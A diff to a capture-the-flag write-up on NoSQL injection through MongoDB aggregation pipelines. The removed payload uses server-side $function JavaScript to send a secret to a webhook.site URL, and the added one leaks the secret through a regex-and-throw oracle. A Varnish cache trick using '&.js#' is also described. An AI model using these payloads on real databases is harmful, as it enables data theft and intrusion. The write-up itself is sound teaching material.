@@ -190,36 +190,31 @@ I crafted a payload using the MongoDB $function operator to try sending the flag
 ```
 {
   "$facet": {
-    "config": [
-      { "$match": { "username": "flag" } },
-      {
-        "$lookup": {
-          "from": "config",
-          "localField": "username",
-          "foreignField": "type",
-          "as": "conf_docs"
-        }
-      },
-      { "$unwind": "$conf_docs" },
-      {
-        "$project": {
-          "_id": 0,
-          "flag_value": "$conf_docs.value"
-        }
-      },
-      {
-        "$addFields": {
-          "leak": {
-            "$function": {
-              "body": "function(value) { require('http').get('https://webhook.site/your-webhook-url/?flag=' + value); return true; }",
-              "args": ["$flag_value"],
-              "lang": "js"
-            }
-          }
-        }
-      }
-    ]
-  }
+      "config": [
+          {"$match": {"username": "flag"}},
+          {"$lookup": {
+              "from": "config",
+              "localField": "username",
+              "foreignField": "type",
+                    "as": "conf_docs"
+          }},
+          {"$unwind": "$conf_docs"},
+          {"$match": {
+              "conf_docs.value": {"$regex": f"^L3AK{escaped_prefix}"}
+          }},
+          {"$addFields": {
+              "trigger_error": {
+                  "$function": {
+                      "body": "function(value) { if(value) { throw new Error(); } return null; }",
+                      "args": ["$conf_docs.value"],
+                      "lang": "js"
+                  }
+              }
+          }},
+          {"$project": {"_id": 0, "flag_value": "$conf_docs.value"}},
+          {"$limit": 1}
+        ]
+    }
 }
 ```
 
@@ -234,6 +229,8 @@ http://localhost/api/search?debug=true&filter={"$facet": {"config": [{"$match": 
 ```
 
 Adding &.js# tricks Varnish into caching the request and ignores everything after the #. This allows the server to process and cache the full NoSQL payload, enabling us to retrieve the flag from the same request without the complexity of character-by-character extraction.
+
+Then i used this URL in the gitsubmodules and uploaded the zip file.
 
 ![alt text](../../../images/ctf/gitbad/flag.png)
 
